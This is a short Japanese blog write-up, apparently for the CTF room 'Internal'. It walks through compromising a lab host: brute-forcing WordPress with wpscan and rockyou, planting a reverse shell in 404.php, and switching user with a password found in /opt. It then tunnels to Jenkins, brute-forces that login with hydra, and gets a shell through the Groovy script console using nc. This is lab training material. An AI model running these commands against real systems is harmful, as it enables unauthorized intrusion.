---
title: "Internal"
date: 2024-03-20T08:06:49+09:00
draft: false
---

### user

- wordpress っぽいので wpscan
  - ```wpscan --url http://internal.thm/blog -e```
  - ```admin``` が見つかる
  - ```wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt```
  - パスワードも見つかる
- wordpress にログインできた
  - ```Appearance``` から ```404.php``` を編集してリバースシェルを入れる([WordPress: Reverse Shell](https://www.hackingarticles.in/wordpress-reverse-shell/))
  - ```http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php``` にアクセス
- aubreanna にしか権限がないため，user.txt が見れない
  - 分からなすぎるので writeup を見ると，```/opt``` にパスワードがあるらしい(は？)
  - ```su aubreanna``` で権限昇格

### root

- aubreanna の /home に jenkins.txt がある

```shell
aubreanna@internal:~$ cat jenkins.txt
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

- ssh トンネル
  - ```ssh -L 1234:172.17.0.2:8080 aubrenna@internal.thm```
  - ```http://127.0.0.1:8080``` で jenkins にアクセスできる
  - ```hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt```
  - script console が見つかる
  - リバースシェルを埋めて ```nc```[Abusing Jenkins Groovy Script Console to get Shell](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6)
